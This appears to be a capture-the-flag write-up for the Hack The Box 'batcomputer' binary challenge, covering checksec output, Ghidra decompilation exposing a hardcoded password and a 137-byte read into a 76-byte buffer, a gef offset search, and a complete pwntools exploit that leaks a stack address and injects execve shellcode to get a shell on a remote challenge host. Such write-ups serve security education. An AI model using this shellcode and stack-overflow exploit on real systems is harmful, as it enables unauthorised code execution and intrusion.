**@A3r1t**

---

# Analysis

```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ file batcomputer
batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped
```

- 64 bits
- Stripped

```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ checksec --file=batcomputer
[*] '/home/kali/Desktop/HTB_BE_track/batcomputer'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: PIE enabled
RWX: Has RWX segments
```

- PIE enabled

## Ghidra: Code Decompile

```c
undefined8 main(void)

{
  int passwd;
  int local_68;
  char acStack100 [16];
  undefined input [76];
  
  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(acStack100,0,0x10);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",input);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack100);
    passwd = strcmp(acStack100,"b4tp@$$w0rd!");
    if (passwd != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,input,137);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```

Found password : `b4tp@$$w0rd!`

read function is trying to get `137` bytes from user but the `input` array is only `76` bytes long,which can lead to **BOF**

---

  

## Finding 0FFs3t

  

```shell
gef➤ pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤ r
Starting program: /home/kali/Desktop/HTB_BE_track/batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: b4tp@$$w0rd!
Access Granted.
Enter the navigation commands: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Roger that!
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 3
Too bad, now who's gonna save Gotham? Alfred?
Program received signal SIGSEGV, Segmentation fault.
0x000055555555531f in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax : 0x0
$rbx : 0x00555555555320 → endbr64
$rcx : 0x007ffff7ec6603 → 0x5577fffff0003d48 ("H="?)
$rdx : 0x0
$rsp : 0x007fffffffdf18 → 0x6161616c61616161 ("aaaalaaa"?)
$rbp : 0x6161616b61616161 ("aaaakaaa"?)
$rsi : 0x007ffff7fa7743 → 0xfa9670000000000a ("\n"?)
$rdi : 0x007ffff7fa9670 → 0x0000000000000000
$rip : 0x0055555555531f → ret
$r8 : 0x2
$r9 : 0x0
$r10 : 0x007ffff7f57ac0 → 0x0000000100000000
$r11 : 0x246
$r12 : 0x005555555550b0 → endbr64
$r13 : 0x0
$r14 : 0x0
$r15 : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdf18│+0x0000: 0x6161616c61616161 ← $rsp
0x007fffffffdf20│+0x0008: 0x6161616d61616161
0x007fffffffdf28│+0x0010: 0x00000001f7fca00a
0x007fffffffdf30│+0x0018: 0x005555555551ec → push rbp
0x007fffffffdf38│+0x0020: 0x007fffffffe339 → 0x7d2f192b231c3dba
0x007fffffffdf40│+0x0028: 0x00555555555320 → endbr64
0x007fffffffdf48│+0x0030: 0xa48ea5b957ec6b9a
0x007fffffffdf50│+0x0038: 0x005555555550b0 → endbr64
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
0x555555555314 call 0x555555555030 <puts@plt>
0x555555555319 mov eax, 0x0
0x55555555531e leave
→ 0x55555555531f ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "batcomputer", stopped 0x55555555531f in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555531f → ret
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ pattern search aaaalaaa
[+] Searching for 'aaaalaaa'
[+] Found at offset 85 (little-endian search) likely
[+] Found at offset 84 (big-endian search)
```

Therefore Offset is `84 bytes`.We also have address of stack from program.

---

# Exploitation

**Python2** Exploit using pwntools library

```python
from pwn import *

context(os='linux',arch='amd64')
#target = process('./batcomputer')
target = remote('139.59.175.51',32499)

offset = 84
password = "b4tp@$$w0rd!"


shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
padding = '0'*(84 - len(shellcode))


target.sendlineafter('>','1')

leaked_add = target.recvlineS().split(": ")[1].strip("\n")
leaked_add = ''.join([chr(int(leaked_add[i:i+2],16)) for i in range(2,len(leaked_add),2)])
leaked_add = leaked_add.rjust(8,'\x00')
leaked_add = u64(leaked_add,endian='big')
p_add = p64(leaked_add)

print "\nStack Address {addd}".format(addd = leaked_add)


payload = shellcode + padding + p_add


target.sendline('2')
target.sendlineafter('the password:',password)
target.sendlineafter('navigation commands:',payload)
target.sendlineafter('2. Chase Joker\n>','3')


target.interactive()
```
